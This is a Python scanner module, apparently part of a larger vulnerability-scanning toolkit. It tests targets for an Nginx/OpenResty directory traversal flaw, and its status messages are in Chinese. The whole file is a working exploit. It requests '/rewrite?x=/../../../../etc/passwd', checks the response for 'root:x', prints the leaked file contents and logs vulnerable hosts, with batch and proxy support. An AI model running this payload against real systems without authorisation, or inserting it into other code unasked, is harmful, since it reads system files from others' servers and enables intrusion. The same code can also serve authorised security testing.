#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Nginx_File_Read_Scan:
    def get_url(self,input_url):
        try:
            url = input_url + "/rewrite?x=/../../../../etc/passwd"
            headers = {
                "Host": input_url.split("://")[-1],
                "User-Agent": self.headers["User-Agent"],
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close",
                "Upgrade-Insecure-Requests": "1"
            }
            req = requests.get(url,headers=headers,proxies=self.proxy,verify=self.ssl)
            if "root:x" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("Nginx", '目标存在Nginx/OpenResty目录穿越漏洞')
                    OutPrintInfo("Nginx", url)
                    OutPrintInfo("Nginx", f"响应:\n{req.text.strip()}")
                else:
                    OutPrintInfoSuc("Nginx", f'目标存在Nginx/OpenResty目录穿越漏洞: {url}')
                    OutPutFile("nginx_openresty_file_read.txt",f'目标存在Nginx/OpenResty目录穿越漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Nginx", f'目标 {input_url} 不存在Nginx/OpenResty目录穿越漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Nginx",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Nginx", '开始检测Nginx/OpenResty目录穿越漏洞...')
        self.get_url(url)

        if not self.batch:
            OutPrintInfo("Nginx", 'Nginx/OpenResty目录穿越漏洞检测结束')

